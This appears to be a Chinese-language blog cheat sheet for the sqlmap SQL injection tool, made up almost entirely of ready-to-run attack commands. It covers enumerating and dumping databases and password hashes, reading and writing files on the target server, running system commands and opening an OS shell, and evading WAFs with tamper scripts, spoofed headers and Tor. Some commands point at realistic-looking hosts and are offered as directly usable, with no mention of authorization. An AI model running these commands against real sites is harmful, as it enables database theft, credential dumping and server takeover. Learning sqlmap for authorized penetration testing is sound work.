---
title: SQLmap使用
createTime: 2025/09/15 16:13:16
permalink: /article/t5evl3h0/
---
## 常见使用命令（可直接使用）

```bash
python sqlmap.py -u "https://www.vuln.cn/post.php?id=1" --force-ssl  --proxy "http://127.0.0.1:7890" --batch --dbs
python sqlmap.py -u "http://www.vuln.cn" –cookie "id=11" --level 2
python sqlmap.py -u "www.xxxx.com/product/detail/id/3*.html" --dbms=mysql -v 3 
python sqlmap.py -r "c:\request.txt" -p id –dbms mysql –file-read="e:\www\as\config.php"
```

## 基础使用命令

```bash
1、判断注入点和数据类型：
	(1) python sqlmap.py -u http://www.test.php?id=1                 #GET方法注入
	(2) python sqlmap.py -r /etc/url.txt                             #POST方法注入(使用Burpsuite等代理工具拦截POST请求内容，将POST请求内容保存在一个文本文件中，此处为url.txt，并用sqlmap调用)
2、判断数据库名(dbs)：python sqlmap.py -u "http://www.test.php?id=1" --dbs
3、判断表名(tables)：python sqlmap.py -u "http://www.test.php?id=1" -D [数据库名] --tables
4、判断列名(columns)：python sqlmap.py -u "http://www.test.php?id=1"-D [数据库名] -T [表名] --column
5、获取字段: python sqlmap.py -u "http://www.test.php?id=1" -D [数据库名] -T [表名] -C [列名] --dump
```

## 常用参数

```bash
--version                         #显示程序的版本号并退出
-h, --help                        #显示此帮助消息并退出
-u                                #设置目标URL
-p                                #指定测试参数
-D                                #指定要进行枚举的数据库名
-U                                #指定要进行枚举的数据库表
-T       						#枚举列的信息
-C                                #指定要进行枚举的数据库列
-U                                #指定要进行枚举的数据车用户
--current-user                    #获取当前用户名称
--current-db                      #获取当前数据库名称
--cookie                          #设置cookie值
--dbs                             #列出数据库
--tables                          #列出数据库中的表
--columns                         #列出表中的列
--dump                            #列出表中的字段
--sql-shell                       #执行SQL命令
--os-cmd                          #执行系统命令
--os-shell                        #与系统交互shell
-r                                #加载外部请求包
--batch                           #使用默认参数进行
--data=DATA                       #通过POST发送数据字符串
--level=LEVEL                     #执行测试的等级（1-5，默认为1)
--risk=RISK                       #执行测试的风险（O-3，默认为1)
-v VERBOSE                        #详细级别:0-6(默认为1)
--proxy=PROXY                     #使用HTTP代理连接到目标URL
--user-agent                      #指定HTTP User-Agent
--tamper=TAMPER                   #使用给定的脚本(S)篡改注入数据
--random-agent                    #随机的请求头!
```

## tamper脚本

::: note 

sqlmap在默认的的情况下除了使用char()函数防止出现单引号，没有对注入的数据进行修改，还可以使用`--tamper`参数对数据做修改来绕过waf等设备。命令如下：

```bash
python sqlmap.py -u [url] --tamper [模块名]
```

:::

```bash
# 使用方法--tamper xxx.py
 
apostrophemask.py	# 用UTF-8全角字符替换单引号字符
apostrophenullencode.py 	# 用非法双字节unicode字符替换单引号字符
appendnullbyte.py	# 在payload末尾添加空字符编码
base64encode.py 	# 对给定的payload全部字符使用Base64编码
between.py		# 分别用“NOT BETWEEN 0 AND #”替换大于号“>”，“BETWEEN # AND #”替换等于号“=”
bluecoat.py 	# 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”
chardoubleencode.py 	# 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）
charencode.py	 # 对给定的payload全部字符使用URL编码（不处理已经编码的字符）
charunicodeencode.py 	 # 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）
concat2concatws.py 		# 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例
equaltolike.py 		# 用“LIKE”运算符替换全部等于号“=”
greatest.py 		# 用“GREATEST”函数替换大于号“>”
halfversionedmorekeywords.py 	# 在每个关键字之前添加MySQL注释
ifnull2ifisnull.py 		# 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例
lowercase.py 		# 用小写值替换每个关键字字符
modsecurityversioned.py 	# 用注释包围完整的查询
modsecurityzeroversioned.py 		# 用当中带有数字零的注释包围完整的查询
multiplespaces.py 		# 在SQL关键字周围添加多个空格
nonrecursivereplacement.py 		# 用representations替换预定义SQL关键字，适用于过滤器
overlongutf8.py 		# 转换给定的payload当中的所有字符
percentage.py 		# 在每个字符之前添加一个百分号
randomcase.py 		# 随机转换每个关键字字符的大小写
randomcomments.py 		# 向SQL关键字中插入随机注释
securesphere.py 		# 添加经过特殊构造的字符串
sp_password.py 		# 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs
space2comment.py 		# 用“/**/”替换空格符
space2dash.py 		# 用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符
space2hash.py 		# 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
space2morehash.py 		# 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
space2mssqlblank.py 		# 用一组有效的备选字符集当中的随机空白符替换空格符
space2mssqlhash.py 		# 用磅注释符“#”其次是一个换行符替换空格符
space2mysqlblank.py 		# 用一组有效的备选字符集当中的随机空白符替换空格符
space2mysqldash.py 			# 用破折号注释符“--”其次是一个换行符替换空格符
space2plus.py 		# 用加号“+”替换空格符
space2randomblank.py 		# 用一组有效的备选字符集当中的随机空白符替换空格符
unionalltounion.py 		# 用“UNION SELECT”替换“UNION ALL SELECT”
unmagicquotes.py 		# 用一个多字节组合%bf%27和末尾通用注释一起替换空格符
varnish.py 				# 添加一个HTTP头“X-originating-IP”来绕过WAF
versionedkeywords.py 		# 用MySQL注释包围每个非函数关键字
versionedmorekeywords.py 		# 用MySQL注释包围每个关键字
xforwardedfor.py 			# 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF
```

## 进阶使用

```sql
python sqlmap.py -u "http://url/news?id=1" --current-user                              #获取当前用户名称
python sqlmap.py -u "http://url/news?id=1" --current-db                                #获取当前数据库名称
python sqlmap.py -u "http://url/news?id=1" --dbs                               		#枚举所有数据库名
python sqlmap.py -u "http://url/news?id=1" -D "db_name" --tables                       #列出指定数据库的表名
python sqlmap.py -u "http://url/news?id=1" -D "db_name" -T "tablename" --columns       #列列出指定数据库对应表的字段
python sqlmap.py -u "http://url/news?id=1" -D "db_name" -T "table_name" -C "column_name" --dump      #获取字段内容
python sqlmap.py -u "http://url/news?id=1" --dbms "Mysql" --users                      #dbms指定数据库类型
python sqlmap.py -u "http://url/news?id=1" --users                                     #列数据车用户
python sqlmap.py -u "http://url/news?id=1" --passwords                                 #数据库用户密码
python sqlmap.py -u "http://url/news?id=1" --sql-shell/--os-cmd                        #执行指定sql命令
python sqlmap.py -u "http://url/news?id=1" --os-cmd=whoami                             #执行系统命令
python sqlmap.py -u "http://url/news?id=1" --os-shell                                  #系统交互shell
python sqlmap.py -u "http://url/news?id=1" --dbs -o"sqImap.log"                        #保存进度
python sqlmap.py -u "http://url/news?id=1" --dbs -o"sqlmap.log" --resume               #恢复已保存进度
python sqlmap.py -u "http://url/news?id=1" --tamper "base64encode.py"                  #加载脚本(可利用绕过注入限制)
python sqlmap.py -u "http://url/news?id=1" -p id  								  	#指定注入参数
python sqlmap.py -u "http://url/news?id=1" --dump-all                                  #爆出该数据库中的所有数据
python sqlmap.py -u "http://url/news?id=1" --proxy="http://127.0.0.1:8080"  		     #指定代理
python sqlmap.py -u "http://url/news?id=1" --delay=3 --force-ssl	     # 当爆破HTTPS网站会出现超时的话，可以使用参数
python sqlmap.py -u "http://url/news?id=1" --is-dba 								   #判断当前用户是否有管理员权限
python sqlmap.py -u "http://url/news?id=1" --identify-waf  						    # 检测是否有WAF
python sqlmap.py -u "http://url/news?id=1" --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件
python sqlmap.py -u "http://url/news?id=1" --file-write  test.txt  --file-dest "e:/hack.txt"  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt
 
===================================================================================
# 过waf手法
python sqlmap.py -u "http://url/news?id=1"
--random-agent                                         # 使用任意的User-Agent爆破
-v3                                                    # 输出详细度，最大值5会显示请求包和回复包
--threads 5                                            # 指定线程数
--fresh-queries                                        # 清除缓存
--flush-session                                        # 清空会话，重构注入 
--batch                                                # 对所有的交互式的都是默认的
--random-agent                                         # 任意的http头
--tamper "base64encode.py "                            # 对提交的数据进行base64编码
--referer http://www.baidu.com                         # 伪造referer字段
--random-agent                                         # 使用任意HTTP头进行绕过，尤其是在WAF配置不当的时候
--time-sec=3                                           # 使用长的延时来避免触发WAF的机制，这方式比较耗时
--hpp                                                  # 使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上
--proxy=http://127.0.0.1:7890                          # 使用代理进行绕过
--ignore-proxy   								    # 禁止使用系统的代理，直接连接进行注入
--flush-session  								    # 清空会话，重构注入
--hex 或者 --no-cast    							   # 进行字符码转换
--mobile         							         # 对移动端的服务器进行注入
--tor           							         # 匿名注入
```
